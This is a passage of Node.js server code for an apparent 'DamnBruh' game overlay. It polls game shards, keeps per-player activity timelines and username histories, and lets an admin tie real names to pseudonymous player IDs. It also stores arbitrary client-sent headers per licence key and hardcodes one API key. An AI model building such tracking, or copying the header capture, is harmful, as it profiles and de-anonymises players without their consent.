import express from "express";
import cors from "cors";
import rateLimit from "express-rate-limit";
import morgan from "morgan";
import fetch from "node-fetch";
import path from "path";
import { fileURLToPath } from "url";
import fs from "fs";              // sync APIs
import { promises as fsp } from "fs";
import crypto from "crypto";

// === Local disk usernames store (disk-only) ================================
const DATA_DIR = process.env.DATA_DIR || "/data";
fs.mkdirSync(DATA_DIR, { recursive: true });
const USER_FILE = path.join(DATA_DIR, "usernames.json");
const XP_FILE = path.join(DATA_DIR, "client-xp.json");
const XP_LOG_ENDPOINT = "https://dbserver-8bhx.onrender.com/api/user/client-xp";
const DASHBOARD_USER = process.env.DASHUSER || "";
const DASHBOARD_PASS = process.env.DASHPASS || "";
// ========= A) Disk-per-player store (V2) + small LRU cache =========
const PLAYER_DIR = path.join(DATA_DIR, "players"); // /data/players
fs.mkdirSync(PLAYER_DIR, { recursive: true });

const PLAYER_CACHE_MAX = Number(process.env.PLAYER_CACHE_MAX || 200);
const __PLAYER_CACHE__ = new Map(); // did -> player (Map order = LRU)
const __PLAYER_DIRTY__ = new Set(); // dids that need flush
let __PLAYER_FLUSHING__ = false;

function didToFile(did) {
  // safe filename
  return path.join(PLAYER_DIR, encodeURIComponent(String(did)) + ".json");
}

function newPlayer() {
  const now = Date.now();
  return {
    realName: null,
    usernames: {},
    topUsernames: [],
    regionCounts: { US: 0, EU: 0 },
    topRegion: null,
    firstSeen: now,
    lastSeen: 0,

    // activity
    lastSeenActivity: 0,
    sessions: [],
    pings: []
  };
}

function touchPlayerCache(did, player) {
  if (__PLAYER_CACHE__.has(did)) __PLAYER_CACHE__.delete(did);
  __PLAYER_CACHE__.set(did, player);

  while (__PLAYER_CACHE__.size > PLAYER_CACHE_MAX) {
    const oldestDid = __PLAYER_CACHE__.keys().next().value;
    // do not flush here, eviction can happen during hot loops
    __PLAYER_CACHE__.delete(oldestDid);
    __PLAYER_DIRTY__.delete(oldestDid);
  }
}

function loadPlayerIfExists(did) {
  try {
    const fp = didToFile(did);
    if (!fs.existsSync(fp)) return null;
    const raw = fs.readFileSync(fp, "utf8");
    if (!raw.trim()) return null;
    const obj = JSON.parse(raw);
    if (!obj || typeof obj !== "object") return null;
    // minimal shape hardening
    if (!obj.usernames || typeof obj.usernames !== "object") obj.usernames = {};
    if (!Array.isArray(obj.topUsernames)) obj.topUsernames = [];
    if (!obj.regionCounts || typeof obj.regionCounts !== "object") obj.regionCounts = { US: 0, EU: 0 };
    if (!Array.isArray(obj.sessions)) obj.sessions = [];
    if (!Array.isArray(obj.pings)) obj.pings = [];
    return obj;
  } catch (e) {
    console.error("[player load]", did, e?.message || e);
    return null;
  }
}

function getPlayerCached(did, create = false) {
  did = String(did || "").trim();
  if (!did) return null;

  if (__PLAYER_CACHE__.has(did)) {
    const p = __PLAYER_CACHE__.get(did);
    touchPlayerCache(did, p);
    return p;
  }

  const fromDisk = loadPlayerIfExists(did);
  if (fromDisk) {
    touchPlayerCache(did, fromDisk);
    return fromDisk;
  }

  if (!create) return null;
  const p = newPlayer();
  touchPlayerCache(did, p);
  __PLAYER_DIRTY__.add(did);
  return p;
}

function markDirty(did) {
  if (did) __PLAYER_DIRTY__.add(String(did));
}

function writeJsonAtomicSync(filePath, obj) {
  const tmp = filePath + ".tmp";
  fs.writeFileSync(tmp, JSON.stringify(obj, null, 2));
  fs.renameSync(tmp, filePath);
}

function flushDirtyPlayersNow() {
  if (__PLAYER_FLUSHING__) return;
  __PLAYER_FLUSHING__ = true;
  try {
    for (const did of Array.from(__PLAYER_DIRTY__)) {
      const p = __PLAYER_CACHE__.get(did) || loadPlayerIfExists(did);
      if (!p) { __PLAYER_DIRTY__.delete(did); continue; }
      writeJsonAtomicSync(didToFile(did), p);
      __PLAYER_DIRTY__.delete(did);
    }
  } catch (e) {
    console.error("[player flush]", e?.message || e);
  } finally {
    __PLAYER_FLUSHING__ = false;
  }
}

// flush dirty players every 15s
setInterval(flushDirtyPlayersNow, 15000);

// Basic auth for dashboard
function requireDashboardAuth(req, res, next) {
  const header = req.headers["authorization"] || "";
  const [scheme, encoded] = header.split(" ");

  const sendAuth = () => {
    res.setHeader("WWW-Authenticate", 'Basic realm="DamnBruh Dashboard"');
    return res.status(401).send("Authentication required");
  };

  if (scheme !== "Basic" || !encoded) {
    return sendAuth();
  }

  let user = "";
  let pass = "";
  try {
    const decoded = Buffer.from(encoded, "base64").toString("utf8");
    const idx = decoded.indexOf(":");
    if (idx === -1) return sendAuth();
    user = decoded.slice(0, idx);
    pass = decoded.slice(idx + 1);
  } catch {
    return sendAuth();
  }

  if (!DASHBOARD_USER || !DASHBOARD_PASS) {
    console.error("DASHUSER / DASHPASS not set in env");
    return res.status(500).send("Dashboard credentials not configured");
  }

  if (user !== DASHBOARD_USER || pass !== DASHBOARD_PASS) {
    return sendAuth();
  }

  // ok
  return next();
}
async function loadUserKeys() {
  try {
    const { data } = await ghLoad(USERKEYS_FILE_PATH, { keys: [] });
    if (!Array.isArray(data.keys)) data.keys = [];
    return data;
  } catch (e) {
    console.error("[userkeys load]", e);
    return { keys: [] };
  }
}

async function requireUsernameKey(req, res, next) {
  const auth = String(req.headers["authorization"] || "");
  if (!auth.startsWith("Bearer ")) {
    return res.status(404).end();
  }

  const key = auth.slice("Bearer ".length).trim();
  if (!key) return res.status(404).end();

  const data = await loadUserKeys();
  const list = Array.isArray(data.keys) ? data.keys : [];
  const found = list.find(k => k.key === key && !k.revoked);

  if (!found) return res.status(404).end();

  req.userKey = key;
  req.userLicense = found;
  return next();
}


function loadXpStore(fallback = {}) {
  try {
    if (fs.existsSync(XP_FILE)) {
      return JSON.parse(fs.readFileSync(XP_FILE, "utf8"));
    }
  } catch (e) {
    console.error("[xp load]", e?.message || e);
  }
  return fallback;
}

function saveXpStore(obj) {
  try {
    fs.writeFileSync(XP_FILE, JSON.stringify(obj, null, 2));
    return true;
  } catch (e) {
    console.error("[xp save]", e?.message || e);
    return false;
  }
}

const __filename = fileURLToPath(import.meta.url);
const INACTIVITY_MS = 3 * 60 * 1000;            // 3 minutes
const RETAIN_MS     = 31 * 24 * 60 * 60 * 1000; // ~31 days

function trimOld(p, now){
  const cutoff = now - RETAIN_MS;
  p.sessions = (p.sessions||[]).filter(s => (s.end ?? s.start) >= cutoff);
  p.pings    = (p.pings   || []).filter(x => x.ts >= cutoff);
}

function pickDidFromQuery(q) {
  if (!q || typeof q !== "object") return "";

  const candidates = [];
  if (typeof q.did === "string") candidates.push(q.did);
  if (typeof q.privyId === "string") candidates.push(q.privyId);
  if (typeof q.id === "string") candidates.push(q.id);

  // supports: ?=did:privy:...
  if (typeof q[""] === "string") candidates.push(q[""]);

  for (const [k, v] of Object.entries(q)) {
    if (typeof v === "string") candidates.push(v);
    if (typeof k === "string") candidates.push(k);
  }

  const did = candidates.find(s => typeof s === "string" && s.startsWith("did:privy:")) || "";
  return did.trim();
}

function sanitizePlayerForMapping(p) {
  if (!p || typeof p !== "object") return null;
  return {
    realName: p.realName ?? null,
    usernames: (p.usernames && typeof p.usernames === "object") ? p.usernames : {},
    topUsernames: Array.isArray(p.topUsernames) ? p.topUsernames : [],
    regionCounts: (p.regionCounts && typeof p.regionCounts === "object")
      ? p.regionCounts
      : { US: 0, EU: 0 },
    topRegion: p.topRegion ?? null,
  };
}


function alignWindowStart(now, binMs, count, tzOffsetMin){
  const off = (tzOffsetMin|0) * 60 * 1000;
  const localNow = now - off;
  const alignedRight = Math.floor(localNow / binMs) * binMs;
  const startLocal = alignedRight - (count - 1) * binMs;
  return startLocal + off;
}
const app  = express();
const jsonBody = express.json({ limit: "256kb" });


// XP cache + flush state
let xpCache = {};
let xpInitialized = false;
let xpDirty = false;


function flushXpStore() {
  if (!xpDirty) return;
  try {
    fs.writeFileSync(XP_FILE, JSON.stringify(xpCache, null, 2));
    xpDirty = false;
  } catch (e) {
    console.error("[xp save]", e?.message || e);
  }
}

// flush every 60s
setInterval(flushXpStore, 60 * 1000);

const __dirname  = path.dirname(__filename);

const PORT = process.env.PORT || 3000;

const ADMIN_TOKEN          = process.env.ADMIN_TOKEN || "";
const GITHUB_TOKEN         = process.env.GITHUB_TOKEN;
const GITHUB_REPO          = process.env.GITHUB_REPO;
const GITHUB_FILE_PATH     = process.env.GITHUB_FILE_PATH     || "keys.json";
const USERKEYS_FILE_PATH   = process.env.USERKEYS_FILE_PATH   || "userkeys.json";
const USERNAMES_FILE_PATH = path.join(DATA_DIR, "usernames.json");


// --- Core version + meta helpers ---
const CORE_PATH = path.join(__dirname, "core.js");
let ACTIVE_VERSION = process.env.ACTIVE_VERSION || "1.1.1"; // default
function sha256Hex(s){ return crypto.createHash('sha256').update(s,'utf8').digest('hex'); }

// In-memory state - REMOVED __USERNAME_MAPPING__ to save RAM
let __JOIN_BUFFER__ = [];                   // events queued between flushes
let __IS_FLUSHING__ = false;


function readCoreBytes() {
  const code = fs.readFileSync(CORE_PATH, "utf8");
  return code;
}

app.use(morgan("tiny"));
app.use(express.json({ limit: "256kb" }));
app.use(cors());

function fileSha256Hex(p) {
  const buf = fs.readFileSync(p);
  return crypto.createHash("sha256").update(buf).digest("hex");
}

const VERSION_PATH = path.join(__dirname, "version.json");

// --- write /version.json so /api/user/core/meta reflects the bump ---
async function writeVersionJSON(v) {
  const payload = { version: String(v), bumpedAt: new Date().toISOString() };
  fs.writeFileSync(VERSION_PATH, JSON.stringify(payload, null, 2));
  return payload;
}

// --- sync the version onto every app key record in both key files ---
async function syncCoreVersionAcrossKeys(newVersion) {
  const files = [GITHUB_FILE_PATH, USERKEYS_FILE_PATH];
  for (const FILE of files) {
    const { data, sha } = await ghLoad(FILE, { keys: [] });
    let changed = false;

    const FIELDS = ["coreVersion", "requiredCore", "version"];
    for (const k of (data.keys || [])) {
      for (const f of FIELDS) {
        if (k[f] !== newVersion) { k[f] = newVersion; changed = true; }
      }
    }

    if (changed) await ghSave(FILE, data, sha);
  }
}

// === DamnBruh shard polling & usernames ===============================
const DB_SHARDS = ['us-1','us-5','us-20','eu-1','eu-5','eu-20'];

const dbShardCache = Object.fromEntries(
  DB_SHARDS.map(k => [k, { updatedAt: 0, top: [] }])
);

function dbToGamePlayersUrl(serverKey) {
  const [region, num] = serverKey.split('-');
  return `https://damnbruh-${region}-${num}.fly.dev/players`;
}
function dbRegion(serverKey) { return serverKey.startsWith('us-') ? 'US' : 'EU'; }
function nowMs() { return Date.now(); }

// --- Activity timeline helpers ---
function ensureActivityPlayer(privyId) {
  return getPlayerCached(privyId, true);
}

function trimOldSessionsOnly(p) {
  const cutoff = nowMs() - RETAIN_MS;
  p.sessions = (p.sessions || []).filter(s => (s.end ?? s.start) >= cutoff);
}

function recordActivity(privyId, now, joinTime) {
  const p = ensureActivityPlayer(privyId);
  if (!p) return;

  const last = p.sessions[p.sessions.length - 1];
  const firstTimeSeen = !last && !p.lastSeenActivity;
  const startMs = (firstTimeSeen && Number.isFinite(joinTime)) ? Number(joinTime) : now;

  if (!last) {
    p.sessions.push({ start: startMs, end: now });
  } else if ((now - (p.lastSeenActivity || 0)) > INACTIVITY_MS) {
    p.sessions.push({ start: Math.min(startMs, now), end: now });
  } else {
    last.end = now;
  }

  compactTailSessions(p);
  trimOldSessionsOnly(p);

  p.lastSeenActivity = now;
  markDirty(privyId);
}

function recordPing(privyId, username, region, ts) {
  const p = ensureActivityPlayer(privyId);
  if (!p) return;

  const t = Number(ts) || Date.now();
  trimOld(p, t);

  p.pings.push({
    ts: t,
    username: typeof username === "string" ? username.slice(0, 48) : "",
    region: (region === "US" || region === "EU") ? region : undefined
  });

  markDirty(privyId);
}


function compactTailSessions(p){
  if (!p || !Array.isArray(p.sessions) || p.sessions.length < 2) return;

  const a = p.sessions;
  const n = a.length;
  const A = a[n - 2];
  const B = a[n - 1];

  const Aend   = Number(A.end ?? A.start);
  const Bstart = Number(B.start);
  const Bend   = Number(B.end ?? B.start);
  if (!Number.isFinite(Aend) || !Number.isFinite(Bstart) || !Number.isFinite(Bend)) return;

  if ((Bstart - Aend) < INACTIVITY_MS) {
    A.end = Math.max(Aend, Bend);
    a.pop();
  }
}



// Binning
const WINDOW_SPECS = {
  '1h': { binMs:  5 * 60 * 1000, count: 12 },
  '1d': { binMs: 60 * 60 * 1000, count: 24 },
  '1w': { binMs: 12 * 60 * 60 * 1000, count: 14 },
  '1m': { binMs: 24 * 60 * 60 * 1000, count: 30 },
};



function makeBinsAndMeta(p, windowKey, tzOffsetMin){
  const spec = WINDOW_SPECS[windowKey] || WINDOW_SPECS["1h"];
  const now = Date.now();
  const startMs = alignWindowStart(now, spec.binMs, spec.count, tzOffsetMin);
  const endMs = startMs + spec.count * spec.binMs;

  const bins = new Uint8Array(spec.count);
  const sessions = Array.isArray(p.sessions) ? p.sessions : [];
  for (const s of sessions) {
    const a = Math.max(s.start, startMs);
    const b = Math.min((s.end ?? s.start), endMs);
    if (b <= a) continue;
    let i = Math.max(0, Math.floor((a - startMs) / spec.binMs));
    let j = Math.min(spec.count - 1, Math.floor((b - 1 - startMs) / spec.binMs));
    for (let k=i;k<=j;k++) bins[k] = 1;
  }

  const meta = Array.from({ length: spec.count }, () => ({
    topUsername: undefined,
    pings: 0,
    topRegion: undefined,
    topRegionPings: 0,
  }));
  const pings = Array.isArray(p.pings) ? p.pings : [];
  for (const x of pings) {
    if (x.ts < startMs || x.ts >= endMs) continue;
    const idx = Math.floor((x.ts - startMs) / spec.binMs);
    const m = meta[idx];
    m.pings += 1;
    if (x.username){ m._u = m._u || {}; m._u[x.username] = (m._u[x.username] || 0) + 1; }
    if (x.region){   m._r = m._r || {}; m._r[x.region]   = (m._r[x.region]   || 0) + 1; }
  }
  for (const m of meta) {
    if (m._u){ let bu="",bc=-1; for (const [u,c] of Object.entries(m._u)) if (c>bc){ bc=c; bu=u; } m.topUsername = bu || undefined; delete m._u; }
    if (m._r){ let br="",bc=-1; for (const [r,c] of Object.entries(m._r)) if (c>bc){ bc=c; br=r; } m.topRegion = br || undefined; m.topRegionPings = Math.max(0,bc); delete m._r; }
  }

  return { startMs, binMs: spec.binMs, bins: Array.from(bins).join(""), meta };
}



const pollInFlight = Object.create(null);

async function dbPollShard(serverKey) {
  if (pollInFlight[serverKey]) return;
  pollInFlight[serverKey] = true;

  try {
    const rsp = await fetch(dbToGamePlayersUrl(serverKey), { method: 'GET' });
    if (!rsp.ok) throw new Error('HTTP ' + rsp.status);

    const data = await rsp.json();
    const playersRaw = Array.isArray(data) ? data : (Array.isArray(data && data.players) ? data.players : []);

    const filtered = playersRaw.filter(function (p) {
      const didOk = p && typeof p.privyId === 'string' && p.privyId.indexOf('did:privy:') === 0;
      const name = ((p && p.name) ? String(p.name) : '').trim();
      const size = Number(p && p.size) || 0;
      return didOk && name && !/^anonymous player$/i.test(name) && size > 2;
    });

    const top = filtered
      .filter(function (p) { return (Number(p && p.monetaryValue) || 0) > 0; })
      .sort(function (a, b) { return (Number(b && b.monetaryValue) || 0) - (Number(a && a.monetaryValue) || 0); })
      .map(function (p, i) {
        return {
          privyId: p.privyId,
          name: ((p && p.name) ? String(p.name) : '').trim(),
          size: Number(p && p.size) || 0,
          monetaryValue: Number(p && p.monetaryValue) || 0,
          joinTime: Number(p && p.joinTime) || undefined,
          rank: i + 1
        };
      });

    const ts = Date.now();
    const region = dbRegion(serverKey);

    for (let i = 0; i < top.length; i++) {
      const tp = top[i];
      recordActivity(tp.privyId, ts, tp.joinTime);
      recordPing(tp.privyId, tp.name, region, ts);
    }

    for (let i = 0; i < filtered.length; i++) {
      const fp = filtered[i];
      const id = fp && fp.privyId;
      const name = ((fp && fp.name) ? String(fp.name) : '').trim();
      if (id && name && !/^anonymous player$/i.test(name)) {
        recordUsername({ privyId: id, username: name, realName: null, region: region });
      }
    }

    dbShardCache[serverKey] = { updatedAt: ts, count: filtered.length, top: top };
  } catch (e) {
    if (serverKey === 'eu-5') {
      // Ignore errors for eu-5
    } else {
      console.error('[poll]', serverKey, (e && e.message) ? e.message : e);
    }
  } finally {
    pollInFlight[serverKey] = false;
  }
}

setInterval(function () { 
  DB_SHARDS.forEach(function (k) { dbPollShard(k); }); 
}, 5000);


// REMOVED: Old usernames.json loading that was eating 100+ MB RAM
// The per-player file system in /data/players/ is now the only source of truth


// Record a single username event into per-player files
function recordUsername({ privyId, username, realName, region }) {
  if (!privyId || !username) return;

  const id = String(privyId);
  const nm = String(username).slice(0, 48);
  const rnm = realName ? String(realName).slice(0, 64) : null;

  const p = getPlayerCached(id, true);
  if (!p) return;

  if (rnm) p.realName = rnm;

  p.usernames[nm] = (p.usernames[nm] || 0) + 1;

  if (!p.regionCounts) p.regionCounts = { US: 0, EU: 0 };
  if (region === "US" || region === "EU") {
    p.regionCounts[region] = (p.regionCounts[region] || 0) + 1;
  }

  const us = Number(p.regionCounts.US || 0);
  const eu = Number(p.regionCounts.EU || 0);
  p.topRegion = (us >= eu) ? "US" : "EU";

  p.topUsernames = Object.entries(p.usernames)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 3)
    .map(([name, count]) => ({ name, count }));

  p.lastSeen = Date.now();
  markDirty(id);
}


// Flush buffer to disk - simplified since we don't have the big mapping anymore
async function flushUsernamesNow() {
  if (__IS_FLUSHING__) return false;
  __IS_FLUSHING__ = true;
  try {
    if (__JOIN_BUFFER__.length) {
      for (const evt of __JOIN_BUFFER__) recordUsername(evt);
      __JOIN_BUFFER__ = [];
    }
    return true;
  } finally {
    __IS_FLUSHING__ = false;
  }
}

// drain frequently; per-player disk flush already happens elsewhere
setInterval(flushUsernamesNow, 5000);



// === Read-only endpoints (client consumes these) ============================
// GET /api/game/leaderboard?serverKey=us-1
app.get('/api/game/leaderboard', requireUsernameKey, (req, res) => {
  const serverKey = String(req.query.serverKey || '');
  if (!DB_SHARDS.includes(serverKey)) return res.status(400).json({ ok:false, error:'invalid_serverKey' });
  const snap = dbShardCache[serverKey] || { updatedAt:0, top:[], count:0 };
  const stale = nowMs() - (snap.updatedAt || 0) > 8000;
  res.json({ ok:true, serverKey, updatedAt: snap.updatedAt || 0, stale, count: snap.count || 0, entries: snap.top || [] });
});


// GET /api/overlay/activity
app.get("/api/overlay/activity", requireUsernameKey, (req, res) => {
  try {
    const privyId     = String(req.query.privyId || "");
    const windowKey   = String(req.query.window || "1h");
    const tzOffsetMin = Number(req.query.tzOffsetMin || 0);
    const spec        = WINDOW_SPECS[windowKey] || WINDOW_SPECS["1h"];
    const p = getPlayerCached(privyId, false) || loadPlayerIfExists(privyId);
    const startMs     = alignWindowStart(Date.now(), spec.binMs, spec.count, tzOffsetMin);

    if (!p) {
      return res.json({ ok:true, privyId, window:windowKey, startMs, binMs:spec.binMs,
                        bins: "".padStart(spec.count, "0"),
                        meta: Array.from({length:spec.count}, ()=>({})) });
    }
    const out = makeBinsAndMeta(p, windowKey, tzOffsetMin);
    res.json({ ok:true, privyId, window:windowKey, ...out });
  } catch (e) {
    res.status(500).json({ ok:false, error: e?.message || String(e) });
  }
});

// POST /api/user/mapping/batch
app.post("/api/user/mapping/batch", requireUsernameKey, jsonBody, (req, res) => {
  try {
    const body = req.body || {};
    let ids = Array.isArray(body.ids) ? body.ids : [];
    ids = ids
      .filter(x => typeof x === "string" && x.startsWith("did:privy:"))
      .slice(0, 50);

    const players = {};
    for (const did of ids) {
      const p = getPlayerCached(did, false) || loadPlayerIfExists(did);
      const clean = sanitizePlayerForMapping(p);
      if (clean) players[did] = clean;
    }

    return res.json({ players, updatedAt: Date.now() });
  } catch (e) {
    console.error("/api/user/mapping/batch:", e);
    return res.status(500).json({ ok: false, error: "server_error" });
  }
});

// POST /api/overlay/activity/batch
app.post("/api/overlay/activity/batch", requireUsernameKey, express.json(), (req, res) => {
  try {
    const body = req.body || {};
    let ids = Array.isArray(body.ids) ? body.ids : [];
    ids = ids.filter(x => typeof x === "string" && x.length > 0).slice(0, 50);

    const windowKey   = String(req.query.window || body.window || "1h");
    const tzOffsetMin = Number(req.query.tzOffsetMin || body.tzOffsetMin || 0);
    const spec = WINDOW_SPECS[windowKey] || WINDOW_SPECS["1h"];

    const data = {};
    const meta = {};
    for (const id of ids) {
      const p = getPlayerCached(id, false) || loadPlayerIfExists(id);
      if (!p) {
        data[id] = "".padStart(spec.count, "0");
        meta[id] = Array.from({ length: spec.count }, () => ({}));
      } else {
        const out = makeBinsAndMeta(p, windowKey, tzOffsetMin);
        data[id] = out.bins;
        meta[id] = out.meta;
      }
    }
    const startMs = alignWindowStart(Date.now(), spec.binMs, spec.count, tzOffsetMin);
    res.json({ ok:true, window:windowKey, startMs, binMs: spec.binMs, data, meta });
  } catch (e) {
    res.status(500).json({ ok:false, error: e?.message || String(e) });
  }
});

app.get("/api/user/admin/all-usernames", (req, res) => {
  if (req.header("admin-token") !== ADMIN_TOKEN)
    return res.status(401).json({ ok: false, error: "unauthorized" });

  try {
    const files = fs.readdirSync(PLAYER_DIR).filter(f => f.endsWith(".json"));
    const players = {};
    for (const f of files) {
      const did = decodeURIComponent(f.slice(0, -5));
      const data = JSON.parse(fs.readFileSync(path.join(PLAYER_DIR, f), "utf8"));
      players[did] = sanitizePlayerForMapping(data);
    }
    res.json({ ok: true, total: files.length, players });
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});



app.get("/api/user/admin/all-activity", async (req, res) => {
  // --- Security check
  if (req.header("admin-token") !== ADMIN_TOKEN)
    return res.status(401).json({ ok: false, error: "unauthorized" });

  try {
    // --- 1. Load all player data
    const files = fs.readdirSync(PLAYER_DIR).filter(f => f.endsWith(".json"));
    const players = {};

    for (const f of files) {
      const did = decodeURIComponent(f.slice(0, -5));
      const data = JSON.parse(fs.readFileSync(path.join(PLAYER_DIR, f), "utf8"));
      players[did] = sanitizePlayerForMapping(data);
    }

    // --- 2. Fetch overlay activity for multiple windows
    const windows = ["1h", "6h", "12h", "24h"];
    const tzOffsetMin = 300; // UTC-5 (EST)
    const timeframeData = {};

    for (const window of windows) {
      try {
        const resp = await fetch(
          `https://dbserver-8bhx.onrender.com/api/overlay/activity/batch?window=${window}&tzOffsetMin=${tzOffsetMin}`,
          {
            headers: { "Authorization": "Bearer KEY-D7CDUFG0" }
          }
        );

        const text = await resp.text();
        let json;
        try {
          json = JSON.parse(text);
        } catch {
          console.error(`Non-JSON response for ${window}:`, text.slice(0, 200));
          continue;
        }

        if (json.ok && json.activity) {
          timeframeData[window] = json.activity;
        } else {
          console.warn(`No valid activity for ${window}`, json);
          timeframeData[window] = {};
        }
      } catch (err) {
        console.error(`Overlay fetch failed for ${window}`, err);
        timeframeData[window] = {};
      }
    }

    // --- 3. Merge activity into each player, with defaults
    for (const [did, player] of Object.entries(players)) {
      player.activityByWindow = {};

      for (const window of Object.keys(timeframeData)) {
        const act = timeframeData[window][did];
        player.activityByWindow[window] = act
          ? { ...act, hasData: true }
          : { isOnline: false, durationMin: 0, lastSeen: null, hasData: false };
      }
    }

    // --- 4. Respond with the full dataset
    res.json({
      ok: true,
      total: files.length,
      updatedAt: Date.now(),
      includesTimeframes: true,
      players
    });
  } catch (err) {
    console.error("Error in /api/user/admin/all-activity:", err);
    res.status(500).json({ ok: false, error: err.message });
  }
});


app.get("/api/game/usernames", requireUsernameKey, (req, res) => {
  try {
    const all = String(req.query.all || "") === "1";
    const limit = Math.max(1, Math.min(50, Number(req.query.limit || 50)));
    const offset = Math.max(0, Number(req.query.offset || 0));

    if (!all) {
      return res.json({ ok:true, note:"use ?all=1&limit=&offset=", total: null, offset, limit, usernames: { players: {} } });
    }

    const files = getPlayerFilesCached();
    const slice = files.slice(offset, offset + limit);

    const players = {};
    for (const f of slice) {
      const did = decodeURIComponent(f.slice(0, -5));
      const p = getPlayerCached(did, false) || loadPlayerIfExists(did);
      const clean = sanitizePlayerForMapping(p);
      if (clean) players[did] = clean;
    }

    return res.json({
      ok: true,
      total: files.length,
      offset,
      limit,
      updatedAt: Date.now(),
      usernames: { players }
    });
  } catch (err) {
    console.error("/api/game/usernames:", err);
    return res.status(500).json({ ok: false, error: "server_error" });
  }
});



const MAPPING_FILE = path.join(DATA_DIR, "mapping.json");

let mapping = { players: {} };
function timeAgo(isoDate) {
  const diff = Date.now() - new Date(isoDate).getTime();
  const mins = Math.floor(diff / 60000);
  if (mins < 1) return "just now";
  if (mins < 60) return `${mins} min${mins !== 1 ? "s" : ""} ago`;
  const hrs = Math.floor(mins / 60);
  if (hrs < 24) return `${hrs} hour${hrs !== 1 ? "s" : ""} ago`;
  const days = Math.floor(hrs / 24);
  return `${days} day${days !== 1 ? "s" : ""} ago`;
}



// Load mapping on startup
try {
  if (fs.existsSync(MAPPING_FILE)) {
    mapping = JSON.parse(fs.readFileSync(MAPPING_FILE, "utf-8"));
    console.log("✅ Loaded mapping from disk");
  } else {
    console.log("🆕 No mapping file found — starting fresh");
  }
} catch (e) {
  console.error("❌ Failed to load mapping:", e);
}


app.post("/api/user/admin/set-name", express.json(), async (req, res) => {
  try {
    const token = req.header("admin-token");
    if (token !== ADMIN_TOKEN) {
      return res.status(401).json({ ok: false, error: "unauthorized" });
    }

    const { did, name } = req.body || {};
    if (!did || !did.startsWith("did:privy:") || !name) {
      return res.status(400).json({ ok:false, error:"invalid_input" });
    }
    const clean = String(name).trim().slice(0, 64);

    const p = getPlayerCached(did, true);
    if (!p) {
      return res.status(500).json({ ok:false, error:"failed_to_get_player" });
    }

    p.realName = clean;
    markDirty(did);
    
    flushDirtyPlayersNow();

    res.json({ ok:true, did, realName: p.realName });
  } catch (e) {
    console.error("set-name:", e);
    res.status(500).json({ ok:false, error:"flush_failed" });
  }
});

// Save periodically (every 60s)
setInterval(() => {
  try {
    fs.writeFileSync(MAPPING_FILE, JSON.stringify(mapping, null, 2));
  } catch (e) {
    console.error("❌ Failed to save mapping:", e);
  }
}, 60000);

// Cache the player file list to avoid readdirSync on every request
let __PLAYER_FILES_CACHE__ = { files: [], updatedAt: 0 };
const PLAYER_FILES_CACHE_TTL = 30000; // 30 seconds

function getPlayerFilesCached() {
  const now = Date.now();
  if (now - __PLAYER_FILES_CACHE__.updatedAt > PLAYER_FILES_CACHE_TTL) {
    try {
      __PLAYER_FILES_CACHE__.files = fs.readdirSync(PLAYER_DIR).filter(f => f.endsWith(".json"));
      __PLAYER_FILES_CACHE__.updatedAt = now;
    } catch (e) {
      console.error("[player files cache]", e?.message || e);
    }
  }
  return __PLAYER_FILES_CACHE__.files;
}

// Disk-only mapping (single source of truth)
app.get("/api/user/mapping", requireUsernameKey, (req, res) => {
  try {
    res.setHeader("Cache-Control", "no-store");

    const did = pickDidFromQuery(req.query);

    if (did) {
      const p = getPlayerCached(did, false) || loadPlayerIfExists(did);
      const one = sanitizePlayerForMapping(p);
      return res.json(one ? { [did]: one } : {});
    }

    const all = String(req.query.all || "") === "1";
    if (!all) {
      return res.status(400).json({ ok:false, error:"missing_did", hint:"use ?did=did:privy:... OR ?all=1&limit=..." });
    }

    const limit = Math.max(1, Math.min(50, Number(req.query.limit || 50)));
    const offset = Math.max(0, Number(req.query.offset || 0));

    const files = getPlayerFilesCached();
    const total = files.length;
    const slice = files.slice(offset, offset + limit);

    const out = {};
    for (const f of slice) {
      const did2 = decodeURIComponent(f.slice(0, -5));
      const p = getPlayerCached(did2, false) || loadPlayerIfExists(did2);
      const clean = sanitizePlayerForMapping(p);
      if (clean) out[did2] = clean;
    }

    return res.json({ ok:true, total, offset, limit, data: out });
  } catch (e) {
    console.error("/api/user/mapping:", e);
    return res.status(500).json({ ok: false, error: "server_error" });
  }
});



app.post("/api/user/client-xp", requireUsernameKey, jsonBody, (req, res) => {
  try {
    const { key, headers, endpoint } = req.body || {};

    if (typeof key !== "string" || !key.startsWith("KEY-")) {
      return res.status(400).json({ ok: false, error: "invalid_key" });
    }

    const store = loadXpStore({});
    const now = new Date().toISOString();

    const existing = (store[key] && typeof store[key] === "object") ? store[key] : {};
    const entry = {
      lastused: now,
      headers: existing.headers || {},
      endpoints: Array.isArray(existing.endpoints) ? existing.endpoints.slice() : []
    };

    if (headers && typeof headers === "object") {
      entry.headers = headers;
    }

    if (typeof endpoint === "string" && endpoint.length) {
      if (!entry.endpoints.includes(endpoint)) {
        entry.endpoints.push(endpoint);
      }
    }

    store[key] = entry;
    saveXpStore(store);

    return res.json({ ok: true });
  } catch (err) {
    console.error("client-xp:", err);
    return res.status(500).json({ ok: false, error: "xp_save_failed" });
  }
});

app.get("/api/user/admin/client-xp", (req, res) => {
  const hdr = req.headers["admin-token"];
  if (hdr !== ADMIN_TOKEN) {
    return res.status(403).json({ ok: false, error: "unauthorized" });
  }

  const store = loadXpStore({});
  return res.json(store);
});
app.post("/api/user/admin/client-xp/delete", jsonBody, (req, res) => {
  const hdr = req.headers["admin-token"];
  if (hdr !== ADMIN_TOKEN) {
    return res.status(403).json({ ok: false, error: "unauthorized" });
  }

  const { key } = req.body || {};
  if (typeof key !== "string" || !key.startsWith("KEY-")) {
    return res.status(400).json({ ok: false, error: "invalid_key" });
  }

  const store = loadXpStore({});
  if (!store[key]) {
    return res.json({ ok: true, note: "no entry for key" });
  }

  store[key].headers = {};
  store[key].lastused = new Date().toISOString();

  saveXpStore(store);
  return res.json({ ok: true });
});



app.post("/api/user/record", requireUsernameKey, jsonBody, (req, res) => {
  const body = req.body || {};
  const arr = Array.isArray(body)
    ? body
    : Array.isArray(body.events)
    ? body.events
    : [body];

  let queued = 0;
  for (const e of arr) {
    if (!e) continue;
    const privyId = e.privyId || e.id || e.playerId;
    const username = e.username || e.name;
    const realName = e.realName;
    if (privyId && username) {
      __JOIN_BUFFER__.push({ privyId, username, realName });
      queued++;
    }
  }
  res.json({ ok: true, queued });
});


app.get("/api/user/core/meta", requireUsernameKey, (req, res) => {
  try {
    const sha256 = fileSha256Hex(CORE_PATH);
